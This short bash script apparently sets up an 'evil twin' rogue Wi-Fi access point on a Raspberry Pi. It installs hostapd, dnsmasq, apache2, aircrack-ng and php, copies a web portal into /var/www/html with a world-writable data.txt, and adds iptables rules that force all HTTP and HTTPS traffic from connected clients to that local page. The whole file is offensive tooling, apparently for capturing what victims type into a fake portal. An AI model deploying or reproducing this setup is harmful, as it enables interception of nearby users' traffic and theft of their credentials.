#!/bin/bash

sudo apt-get install hostapd -y && sudo apt-get install dnsmasq -y && sudo apt-get install apache2 -y && sudo apt-get install aircrack-ng -y && sudo apt-get install php -y && sudo cp -r www/* /var/www/html && sudo chmod 777 /var/www/html/data.txt && sudo chmod +x Twin/stop-AP.sh && sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 80 -j DNAT --to-destination 192.168.1.1:80 && sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 192.168.1.0/24 --dport 443 -j DNAT --to-destination 192.168.1.1:80 && sudo cp -r Twin /home/pi



